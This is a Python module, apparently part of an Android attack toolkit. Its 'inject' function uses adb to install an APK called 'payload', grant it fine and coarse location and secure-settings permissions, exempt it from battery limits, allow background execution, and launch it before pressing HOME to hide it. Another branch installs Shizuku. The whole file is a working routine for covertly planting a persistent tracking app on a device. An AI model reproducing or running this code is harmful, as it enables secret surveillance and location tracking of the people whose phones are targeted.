import os

from utils.status import *
import lib.executor.adb as adb

from utils.config import PACKAGE

def inject(apk_name):
    if(apk_name == "payload"):
        apk = os.path.join("dist", "app.apk")
        if not os.path.exists(apk):
            bad(f"APK not found: {apk}")
            return

        info("Installing APK...")
        adb(["install", "-r", apk])

        info("Granting permissions...")
        permissions = ["android.permission.WRITE_SECURE_SETTINGS", "android.permission.POST_NOTIFICATIONS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"]

        for perm in permissions:
            adb(["shell", "pm", "grant", PACKAGE, perm])

        info("Whitelisting battery optimization...")
        adb(["shell", "dumpsys", "deviceidle", "whitelist", "+" + PACKAGE])

        info("Allowing background execution...")
        adb(["shell", "cmd", "appops", "set", PACKAGE, "RUN_IN_BACKGROUND", "allow"])
        adb(["shell", "cmd", "appops", "set", PACKAGE, "RUN_ANY_IN_BACKGROUND", "allow"])

        info("Launching application...")
        adb(["shell", "monkey", "-p", PACKAGE, "-c", "android.intent.category.LAUNCHER", "1"])
        adb(["shell", "input", "keyevent", "KEYCODE_HOME"])

        good("Injection completed.")
    elif(apk_name == "shizuku"):
        apk = os.path.join("shizuku", "app.apk")
        if not os.path.exists(apk):
            bad(f"APK not found: {apk}")
            return

        info("Installing APK...")
        adb(["install", "-r", apk])
        good("Installation Complete")